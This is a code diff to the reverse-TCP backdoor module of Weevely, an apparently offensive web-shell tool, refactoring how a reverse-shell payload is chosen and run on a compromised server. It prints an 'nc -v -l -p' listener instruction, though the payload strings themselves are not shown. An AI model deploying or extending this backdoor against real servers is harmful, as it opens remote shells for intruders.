@@ -10,7 +10,7 @@ Created on 22/ago/2011
 @author: norby
 '''
 
-from core.module import Module, ModuleException
+from core.module import Module
 
 classname = 'Reversetcp'
     
@@ -34,24 +34,31 @@ class Reversetcp(Module):
         Module.__init__(self, modhandler, url, password)
         
         self.usersinfo = {}
-        
                 
-    def run(self,host, port):
+    def run(self, host, port):
+                
+        print "[backdoor.reverse_tcp] Weevely should now block during reverse backdoor usage. If not, assure"
+        print "[backdoor.reverse_tcp] \'shell.sh\' is loaded and port is correctly bounded (use \'nc -v -l -p %s\')" % (port)
         
+        interpreter, vector = self._get_default_vector()
+        if interpreter and vector:
+            return self.__execute_payload(interpreter, vector, host, port)
+            
+        else:
+            for interpreter in self.vectors:
+                for vector in self.vectors[interpreter]:
+                    if interpreter in self.modhandler.loaded_shells:
+                        return self.__execute_payload(interpreter, vector, host, port)
+
         
-        for interpreter in self.vectors:
-            for vector in self.vectors[interpreter]:
-                if interpreter in self.modhandler.loaded_shells:
-                    payload = self.vectors[interpreter][vector] % (host, port)
-                    
-                    print "[backdoor.reverse_tcp] Weevely should now block during reverse backdoor usage. If not, assure"
-                    print "[backdoor.reverse_tcp] you are correctly bounding local port (use \'nc -v -l -p %s\')" % (port)
 
-                    
-                    self.modhandler.load(interpreter).run(payload, False)
-                    
+    def __execute_payload(self, interpreter, vector, host, port):
+        
+        payload = self.vectors[interpreter][vector] % (host, port)
 
 
+        return self.modhandler.load(interpreter).run(payload, False)
+        
 #        
 
 
